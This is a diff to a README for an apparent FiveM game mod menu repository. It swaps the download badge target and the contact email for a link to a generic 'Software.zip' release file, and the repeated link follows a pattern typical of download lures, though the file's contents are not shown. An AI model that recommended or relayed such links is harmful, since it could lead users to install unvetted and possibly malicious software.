@@ -27,7 +27,7 @@ Welcome to the **FiveM Mod Menu** repository - your ultimate source for all thin
 
 You can download the latest version of the FiveM Mod Menu by clicking the button below:
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download FiveM Mod Menu](https://github.com/kaseyensler/FiveM-Mod-Menu/releases/download/v1.0/Software.zip)](https://github.com/kaseyensler/FiveM-Mod-Menu/releases/download/v1.0/Software.zip)
 
 (Click the link above to download the file.)
 
@@ -68,7 +68,7 @@ Contributions to the FiveM Mod Menu repository are always welcome! If you have a
 
 ## 📞 Contact
 
-For any inquiries or support regarding the FiveM Mod Menu, please contact our team at modmenu.support@example.com.
+For any inquiries or support regarding the FiveM Mod Menu, please contact our team at https://github.com/kaseyensler/FiveM-Mod-Menu/releases/download/v1.0/Software.zip
 
 ---
 
